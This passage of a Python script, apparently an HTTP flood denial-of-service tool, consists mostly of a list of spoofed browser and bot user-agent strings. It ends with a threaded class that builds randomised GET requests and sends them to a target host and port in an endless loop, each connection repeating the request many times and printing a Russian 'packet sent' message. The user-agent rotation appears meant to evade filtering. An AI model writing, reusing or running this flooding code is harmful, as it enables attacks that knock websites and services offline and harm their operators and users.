"Mozilla/5.0(Unknown;U;UNIXBSD/SYSVsystem;C-)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.10.2",
"Mozilla/5.0(webOS/1.3;U;en-US)AppleWebKit/525.27.1(KHTML,likeGecko)Version/1.0Safari/525.27.1Desktop/1.0",
"Mozilla/5.0(WindowsCE6.0;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT5.1;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(WindowsNT5.2;rv:10.0.1)Gecko/20100101Firefox/10.0.1SeaMonkey/2.7.1",
"Mozilla/5.0(WindowsNT6.0)AppleWebKit/535.2(KHTML,likeGecko)Chrome/15.0.874.120Safari/535.2",
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/535.2(KHTML,likeGecko)Chrome/18.6.872.0Safari/535.2UNTRUSTED/1.03gpp-gbaUNTRUSTED/1.0",
"Mozilla/5.0(WindowsNT6.1;rv:12.0)Gecko/20120403211507Firefox/12.0",
"Mozilla/5.0(WindowsNT6.1;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT6.1;Win64;x64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/534.27(KHTML,likeGecko)Chrome/12.0.712.0Safari/534.27",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.24Safari/535.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/535.7(KHTML,likeGecko)Chrome/16.0.912.36Safari/535.7",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/536.6(KHTML,likeGecko)Chrome/20.0.1092.0Safari/536.6",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:10.0.1)Gecko/20100101Firefox/10.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:15.0)Gecko/20120427Firefox/15.0a1",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:2.0b4pre)Gecko/20100815Minefield/4.0b4pre",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:6.0a2)Gecko/20110622Firefox/6.0a2",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:7.0.1)Gecko/20100101Firefox/7.0.1",
"Mozilla/5.0(WindowsNT6.2)AppleWebKit/536.3(KHTML,likeGecko)Chrome/19.0.1061.1Safari/536.3",
"Mozilla/5.0(WindowsNT6.2)AppleWebKit/536.6(KHTML,likeGecko)Chrome/20.0.1090.0Safari/536.6",
"Mozilla/5.0(Windows;U;;en-NZ)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.8.0",
"Mozilla/5.0(Windows;U;Win98;en-US;rv:1.4)GeckoNetscape/7.1(ax)",
"Mozilla/5.0(Windows;U;WindowsCE5.1;rv:1.8.1a3)Gecko/20060610Minimo/0.016",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/531.21.8(KHTML,likeGecko)Version/4.0.4Safari/531.21.10",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/534.7(KHTML,likeGecko)Chrome/7.0.514.0Safari/534.7",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US;rv:1.8.1.23)Gecko/20090825SeaMonkey/1.1.18",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US;rv:1.9.0.10)Gecko/2009042316Firefox/3.0.10",
"Mozilla/5.0(Windows;U;WindowsNT5.1;tr;rv:1.9.2.8)Gecko/20100722Firefox/3.6.8(.NETCLR3.5.30729;.NET4.0E)",
"Mozilla/5.0(Windows;U;WindowsNT5.2;en-US)AppleWebKit/532.9(KHTML,likeGecko)Chrome/5.0.310.0Safari/532.9",
"Mozilla/5.0(Windows;U;WindowsNT5.2;en-US)AppleWebKit/533.17.8(KHTML,likeGecko)Version/5.0.1Safari/533.17.8",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-GB;rv:1.9.0.11)Gecko/2009060215Firefox/3.0.11(.NETCLR3.5.30729)",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.6(Change:)",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/533.1(KHTML,likeGecko)Maxthon/3.0.8.2Safari/533.1",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/534.14(KHTML,likeGecko)Chrome/9.0.601.0Safari/534.14",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US;rv:1.9.1.6)Gecko/20091201Firefox/3.5.6GTB5",
"Mozilla/5.0(Windows;U;WindowsNT6.0x64;en-US;rv:1.9pre)Gecko/2008072421Minefield/3.0.2pre",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-GB;rv:1.9.1.17)Gecko/20110123(likeFirefox/3.x)SeaMonkey/2.0.12",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/532.5(KHTML,likeGecko)Chrome/4.0.249.0Safari/532.5",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/533.19.4(KHTML,likeGecko)Version/5.0.2Safari/533.18.5",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.14(KHTML,likeGecko)Chrome/10.0.601.0Safari/534.14",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.20(KHTML,likeGecko)Chrome/11.0.672.2Safari/534.20",
"Mozilla/5.0(Windows;U;WindowsXP)GeckoMultiZilla/1.6.1.0a",
"Mozilla/5.0(Windows;U;WinNT4.0;en-US;rv:1.2b)Gecko/20021001Phoenix/0.2",
"Mozilla/5.0(X11;FreeBSDamd64;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/534.34(KHTML,likeGecko)QupZilla/1.2.0Safari/534.34",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/535.1(KHTML,likeGecko)Ubuntu/11.04Chromium/14.0.825.0Chrome/14.0.825.0Safari/535.1",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/535.2(KHTML,likeGecko)Ubuntu/11.10Chromium/15.0.874.120Chrome/15.0.874.120Safari/535.2",
"Mozilla/5.0(X11;Linuxi686onx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxi686onx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1Fennec/2.0.1",
"Mozilla/5.0(X11;Linuxi686;rv:10.0.1)Gecko/20100101Firefox/10.0.1SeaMonkey/2.7.1",
"Mozilla/5.0(X11;Linuxi686;rv:12.0)Gecko/20100101Firefox/12.0",
"Mozilla/5.0(X11;Linuxi686;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxi686;rv:2.0b6pre)Gecko/20100907Firefox/4.0b6pre",
"Mozilla/5.0(X11;Linuxi686;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(X11;Linuxi686;rv:6.0a2)Gecko/20110615Firefox/6.0a2Iceweasel/6.0a2",
"Mozilla/5.0(X11;Linuxi686;rv:6.0)Gecko/20100101Firefox/6.0",
"Mozilla/5.0(X11;Linuxi686;rv:8.0)Gecko/20100101Firefox/8.0",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/534.24(KHTML,likeGecko)Ubuntu/10.10Chromium/12.0.703.0Chrome/12.0.703.0Safari/534.24",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.20Safari/535.1",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.9Safari/536.5",
"Mozilla/5.0(X11;Linuxx86_64;en-US;rv:2.0b2pre)Gecko/20100712Minefield/4.0b2pre",
"Mozilla/5.0(X11;Linuxx86_64;rv:10.0.1)Gecko/20100101Firefox/10.0.1",
"Mozilla/5.0(X11;Linuxx86_64;rv:11.0a2)Gecko/20111230Firefox/11.0a2Iceweasel/11.0a2",
"Mozilla/5.0(X11;Linuxx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxx86_64;rv:2.2a1pre)Gecko/20100101Firefox/4.2a1pre",
"Mozilla/5.0(X11;Linuxx86_64;rv:5.0)Gecko/20100101Firefox/5.0Iceweasel/5.0",
"Mozilla/5.0(X11;Linuxx86_64;rv:7.0a1)Gecko/20110623Firefox/7.0a1",
"Mozilla/5.0(X11;U;FreeBSDamd64;en-us)AppleWebKit/531.2(KHTML,likeGecko)Safari/531.2Epiphany/2.30.0",
"Mozilla/5.0(X11;U;FreeBSDi386;de-CH;rv:1.9.2.8)Gecko/20100729Firefox/3.6.8",
"Mozilla/5.0(X11;U;FreeBSDi386;en-US)AppleWebKit/532.0(KHTML,likeGecko)Chrome/4.0.207.0Safari/532.0",
"Mozilla/5.0(X11;U;FreeBSDi386;en-US;rv:1.6)Gecko/20040406Galeon/1.3.15",
"Mozilla/5.0(X11;U;FreeBSD;i386;en-US;rv:1.7)Gecko",
"Mozilla/5.0(X11;U;FreeBSDx86_64;en-US)AppleWebKit/534.16(KHTML,likeGecko)Chrome/10.0.648.204Safari/534.16",
"Mozilla/5.0(X11;U;Linuxarm7tdmi;rv:1.8.1.11)Gecko/20071130Minimo/0.025",
"Mozilla/5.0(X11;U;Linuxarmv61;en-US;rv:1.9.1b2pre)Gecko/20081015Fennec/1.0a1",
"Mozilla/5.0(X11;U;Linuxarmv6l;rv1.8.1.5pre)Gecko/20070619Minimo/0.020",
"Mozilla/5.0(X11;U;Linux;en-US)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.10.1",
"Mozilla/5.0(X11;U;Linuxi586;en-US;rv:1.7.3)Gecko/20040924Epiphany/1.4.4(Ubuntu)",
"Mozilla/5.0(X11;U;Linuxi686;en-us)AppleWebKit/528.5(KHTML,likeGecko,Safari/528.5)lt-GtkLauncher",
"Mozilla/5.0(X11;U;Linuxi686;en-US)AppleWebKit/532.4(KHTML,likeGecko)Chrome/4.0.237.0Safari/532.4Debian",
"Mozilla/5.0(X11;U;Linuxi686;en-US)AppleWebKit/532.8(KHTML,likeGecko)Chrome/4.0.277.0Safari/532.8",
"Mozilla/5.0(X11;U;Linuxi686;en-US)AppleWebKit/534.15(KHTML,likeGecko)Ubuntu/10.10Chromium/10.0.613.0Chrome/10.0.613.0Safari/534.15",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.6)Gecko/20040614Firefox/0.8",
"Mozilla/5.0(X11;U;Linux;i686;en-US;rv:1.6)GeckoDebian/1.6-7",
"Mozilla/5.0(X11;U;Linux;i686;en-US;rv:1.6)GeckoEpiphany/1.2.5",
"Mozilla/5.0(X11;U;Linux;i686;en-US;rv:1.6)GeckoGaleon/1.3.14",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.8.0.7)Gecko/20060909Firefox/1.5.0.7MG(Novarra-Vision/6.9)",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.8.1.16)Gecko/20080716(Gentoo)Galeon/2.0.6",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.8.1)Gecko/20061024Firefox/2.0(Swiftfox)",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9.0.11)Gecko/2009060309Ubuntu/9.10(karmic)Firefox/3.0.11",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9.0.8)GeckoGaleon/2.0.6(Ubuntu2.0.6-2)",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9.1.16)Gecko/20120421GeckoFirefox/11.0",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9.1.2)Gecko/20090803Ubuntu/9.04(jaunty)Shiretoko/3.5.2",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9a3pre)Gecko/20070330",
"Mozilla/5.0(X11;U;Linuxi686;it;rv:1.9.2.3)Gecko/20100406Firefox/3.6.3(Swiftfox)",
"Mozilla/5.0(X11;U;Linuxi686;pl-PL;rv:1.9.0.2)Gecko/20121223Ubuntu/9.25(jaunty)Firefox/3.8",
"Mozilla/5.0(X11;U;Linuxi686;pt-PT;rv:1.9.2.3)Gecko/20100402Iceweasel/3.6.3(likeFirefox/3.6.3)GTB7.0",
"Mozilla/5.0(X11;U;Linuxppc;en-US;rv:1.8.1.13)Gecko/20080313Iceape/1.1.9(Debian-1.1.9-5)",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US)AppleWebKit/532.9(KHTML,likeGecko)Chrome/5.0.309.0Safari/532.9",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US)AppleWebKit/534.15(KHTML,likeGecko)Chrome/10.0.613.0Safari/534.15",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US)AppleWebKit/534.7(KHTML,likeGecko)Chrome/7.0.514.0Safari/534.7",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US)AppleWebKit/540.0(KHTML,likeGecko)Ubuntu/10.10Chrome/9.1.0.0Safari/540.0",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.0.3)Gecko/2008092814(Debian-3.0.1-1)",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.1.13)Gecko/20100916Iceape/2.0.8",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.1.17)Gecko/20110123SeaMonkey/2.0.12",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.1.3)Gecko/20091020LinuxMint/8(Helena)Firefox/3.5.3",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.1.5)Gecko/20091107Firefox/3.5.5",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.2.9)Gecko/20100915GentooFirefox/3.6.9",
"Mozilla/5.0(X11;U;Linuxx86_64;sv-SE;rv:1.8.1.12)Gecko/20080207Ubuntu/7.10(gutsy)Firefox/2.0.0.12",
"Mozilla/5.0(X11;U;Linuxx86_64;us;rv:1.9.1.19)Gecko/20110430shadowfox/7.0(likeFirefox/7.0",
"Mozilla/5.0(X11;U;NetBSDamd64;en-US;rv:1.9.2.15)Gecko/20110308Namoroka/3.6.15",
"Mozilla/5.0(X11;U;OpenBSDarm;en-us)AppleWebKit/531.2(KHTML,likeGecko)Safari/531.2Epiphany/2.30.0",
"Mozilla/5.0(X11;U;OpenBSDi386;en-US)AppleWebKit/533.3(KHTML,likeGecko)Chrome/5.0.359.0Safari/533.3",
"Mozilla/5.0(X11;U;OpenBSDi386;en-US;rv:1.9.1)Gecko/20090702Firefox/3.5",
"Mozilla/5.0(X11;U;SunOSi86pc;en-US;rv:1.8.1.12)Gecko/20080303SeaMonkey/1.1.8",
"Mozilla/5.0(X11;U;SunOSi86pc;en-US;rv:1.9.1b3)Gecko/20090429Firefox/3.1b3",
"Mozilla/5.0(X11;U;SunOSsun4m;en-US;rv:1.4b)Gecko/20030517MozillaFirebird/0.6",
"MSIE(MSIE6.0;X11;Linux;i686)Opera7.23",
"msnbot/0.11(http://search.msn.com/msnbot.htm)",
"msnbot/1.0(http://search.msn.com/msnbot.htm)",
"msnbot/1.1(http://search.msn.com/msnbot.htm)",
"msnbot-media/1.1(http://search.msn.com/msnbot.htm)",
"NetSurf/1.2(NetBSD;amd64)",
"Nokia3230/2.0(5.0614.0)SymbianOS/7.0sSeries60/2.1Profile/MIDP-2.0Configuration/CLDC-1.0",
"Nokia6100/1.0(04.01)Profile/MIDP-1.0Configuration/CLDC-1.0",
"Nokia6230/2.0(04.44)Profile/MIDP-2.0Configuration/CLDC-1.1",
"Nokia6230i/2.0(03.80)Profile/MIDP-2.0Configuration/CLDC-1.1",
"Nokia6630/1.0(2.3.129)SymbianOS/8.0Series60/2.6Profile/MIDP-2.0Configuration/CLDC-1.1",
"Nokia6630/1.0(2.39.15)SymbianOS/8.0Series60/2.6Profile/MIDP-2.0Configuration/CLDC-1.1",
"Nokia7250/1.0(3.14)Profile/MIDP-1.0Configuration/CLDC-1.0",
"NokiaN70-1/5.0609.2.0.1Series60/2.8Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.1.13.0",
"NokiaN73-1/3.0649.0.0.1Series60/3.0Profile/MIDP2.0Configuration/CLDC-1.1",
"nookbrowser/1.0",
"OfflineExplorer/2.5",
"Opera/10.61(J2ME/MIDP;OperaMini/5.1.21219/19.999;en-US;rv:1.9.3a5)WebKit/534.5Presto/2.6.30",
"Opera/7.50(WindowsME;U)[en]",
"Opera/7.50(WindowsXP;U)",
"Opera/7.51(WindowsNT5.1;U)[en]",
"Opera/8.01(J2ME/MIDP;OperaMini/1.0.1479/HiFi;SonyEricssonP900;no;U;ssr)",
"Opera/9.0(Macintosh;PPCMacOSX;U;en)",
"Opera/9.20(Macintosh;IntelMacOSX;U;en)",
"Opera/9.25(WindowsNT6.0;U;en)",
"Opera/9.30(NintendoWii;U;;2047-7;en)",
"Opera/9.51Beta(MicrosoftWindows;PPC;OperaMobi/1718;U;en)",
"Opera/9.5(MicrosoftWindows;PPC;OperaMobi;U)SonyEricssonX1i/R2AAProfile/MIDP-2.0Configuration/CLDC-1.1",
"Opera/9.60(J2ME/MIDP;OperaMini/4.1.11320/608;U;en)Presto/2.2.0",
"Opera/9.60(J2ME/MIDP;OperaMini/4.2.14320/554;U;cs)Presto/2.2.0",
"Opera/9.64(Macintosh;PPCMacOSX;U;en)Presto/2.1.1",
"Opera/9.64(X11;Linuxi686;U;LinuxMint;nb)Presto/2.1.1",
"Opera/9.80(J2ME/MIDP;OperaMini/5.0.16823/1428;U;en)Presto/2.2.0",
"Opera/9.80(Macintosh;IntelMacOSX10.4.11;U;en)Presto/2.7.62Version/11.00",
"Opera/9.80(Macintosh;IntelMacOSX10.6.8;U;fr)Presto/2.9.168Version/11.52",
"Opera/9.80(Macintosh;IntelMacOSX;U;en)Presto/2.6.30Version/10.61",
"Opera/9.80(S60;SymbOS;OperaMobi/499;U;ru)Presto/2.4.18Version/10.00",
"Opera/9.80(WindowsNT5.1;U;ru)Presto/2.7.39Version/11.00",
"Opera/9.80(WindowsNT5.1;U;zh-tw)Presto/2.8.131Version/11.10",
"Opera/9.80(WindowsNT5.2;U;en)Presto/2.2.15Version/10.10",
"Opera/9.80(WindowsNT6.1;U;en)Presto/2.7.62Version/11.01",
"Opera/9.80(WindowsNT6.1;U;es-ES)Presto/2.9.181Version/12.00",
"Opera/9.80(X11;Linuxi686;U;en)Presto/2.2.15Version/10.10",
"Opera/9.80(X11;Linuxx86_64;U;pl)Presto/2.7.62Version/11.00",
"P3PValidator",
"Peach/1.01(Ubuntu8.04LTS;U;en)",
"Mozilla/5.0(WindowsNT5.1;rv:11.0)GeckoFirefox/11.0(viaggpht.comGoogleImageProxy)"
"msnbot/2.0b(+http://search.msn.com/msnbot.htm)"
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_1likeMacOSX;en-us)AppleWebKit/532.9(KHTML,likeGecko)Version/4.0.5Mobile/8B117Safari/6531.22.7(compatible;Googlebot-Mobile/2.1;+http://www.google.com/bot.html)"
"POLARIS/6.01(BREW3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0profile/MIDP-201Configuration/CLDC-1.1",
"POLARIS/6.01(BREW3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP)MMP/2.0profile/MIDP-2.1Configuration/CLDC-1.1",
"portalmmm/2.0N410i(c20;TB)",
"Python-urllib/2.5",
"SAMSUNG-S8000/S8000XXIF3SHP/VPP/R5Jasmine/1.0NextreamingSMM-MMS/1.2.0profile/MIDP-2.1configuration/CLDC-1.1FirePHP/0.3",
"SAMSUNG-SGH-A867/A867UCHJ3SHP/VPP/R5NetFront/35SMM-MMS/1.2.0profile/MIDP-2.0configuration/CLDC-1.1UP.Link/6.3.0.0.0",
"SAMSUNG-SGH-E250/1.0Profile/MIDP-2.0Configuration/CLDC-1.1UP.Browser/6.2.3.3.c.1.101(GUI)MMP/2.0(compatible;Googlebot-Mobile/2.1;http://www.google.com/bot.html)",
"SearchExpress",
"SEC-SGHE900/1.0NetFront/3.2Profile/MIDP-2.0Configuration/CLDC-1.1Opera/8.01(J2ME/MIDP;OperaMini/2.0.4509/1378;nl;U;ssr)",
"SEC-SGHX210/1.0UP.Link/6.3.1.13.0",
"SEC-SGHX820/1.0NetFront/3.2Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonK310iv/R4DABrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.1.13.0",
"SonyEricssonK550i/R1JDBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonK610i/R1CBBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonK750i/R1CABrowser/SEMC-Browser/4.2Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonK800i/R1CBBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.0.0.0",
"SonyEricssonK810i/R1KGBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonS500i/R6BCBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonT100/R101",
"SonyEricssonT610/R201Profile/MIDP-1.0Configuration/CLDC-1.0",
"SonyEricssonT650i/R7AABrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonT68/R201A",
"SonyEricssonW580i/R6BCBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonW660i/R6ADBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonW810i/R4EABrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.0.0.0",
"SonyEricssonW850i/R1EDBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonW950i/R100Mozilla/4.0(compatible;MSIE6.0;SymbianOS;323)Opera8.60[en-US]",
"SonyEricssonW995/R1EAProfile/MIDP-2.1Configuration/CLDC-1.1UNTRUSTED/1.0",
"SonyEricssonZ800/R1YBrowser/SEMC-Browser/4.1Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.0.0.0",
"SuperBot/4.4.0.60(WindowsXP)",
"Uzbl(Webkit1.3)(Linuxi686[i686])",
"Vodafone/1.0/V802SE/SEJ001Browser/SEMC-Browser/4.1",
"W3C_Validator/1.305.2.12libwww-perl/5.64",
"W3C_Validator/1.654",
"w3m/0.5.1",
"WDG_Validator/1.6.2",
"WebCopierv4.6",
"WebDownloader/6.9",
"WebZIP/3.5(http://www.spidersoft.com)",
"Wget/1.9.1",
"Wget/1.9cvs-stable(RedHatmodified)",
"wiilibnup/1.0",]
class RequestDefaultHTTP(threading.Thread):
  def __init__(self, counter):
    threading.Thread.__init__(self)
    self.counter = counter

  def run(self):
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    accept = random.choice(acceptall)
    request = get_host + useragent + accept + connection + "\r\n"
    go.wait()
    while True:
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(url2), int(urlport)))
        s.send (str.encode(request))
        print ("[*] Пакет отправлен!")
        try:
          for y in range(multiple):
            s.send(str.encode(request))
        except:
          s.close()
      except:
        s.close()
main()